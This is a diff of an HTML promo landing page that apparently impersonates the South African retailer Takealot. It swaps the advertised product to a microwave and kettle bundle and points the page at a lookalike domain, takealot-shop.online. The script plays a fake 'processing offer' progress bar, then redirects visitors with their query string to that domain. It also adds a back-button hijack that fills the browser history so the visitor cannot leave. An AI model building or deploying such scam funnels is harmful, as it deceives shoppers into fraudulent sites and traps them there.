@@ -201,7 +201,7 @@
         <div class="promo-badge">HOT PROMO</div>
 
         <h1>Processing Offer</h1>
-        <p>Air Fryer 6L LED Display + Blender with Mill 500W - BLP15.150WH...</p>
+        <p>Verifying exclusive Russell Hobbs 20L Electronic Microwave + Cordless Stainless Steel Kettle RHSSK04...</p>
 
         <div class="progress-container">
             <div class="progress-bar" id="progress"></div>
@@ -243,23 +243,24 @@
                 statusEl.innerText = statuses[currentStatus].toUpperCase();
             }
 
-          if (progress < 100) {
-    requestAnimationFrame(update);
-} else {
-    setTimeout(() => {
-        window.location.href =
-          'https://airfryer.takealot-shop.online/' + location.search;
-    }, 500);
-}
+            if (progress < 100) {
+                requestAnimationFrame(update);
+            } else {
+                setTimeout(() => {
+                  window.location.href = 'https://micro.takealot-shop.online/' + location.search;
+                }, 500);
+            }
+        }
+
         // Wait slightly before starting
         setTimeout(() => {
             update();
         }, 500);
     </script>
-    <!-- BACK REDIRECT -->
+     <!-- BACK REDIRECT -->
 <script>
   var back_redirect_back_link =
-    "https://airfryer.takealot-shop.online/" + location.search;
+    "https://micro.takealot-shop.online/" + location.search;
 
   history.pushState({}, "", location.href);
   history.pushState({}, "", location.href);
@@ -276,5 +277,3 @@
 
 
 </html>
-
-
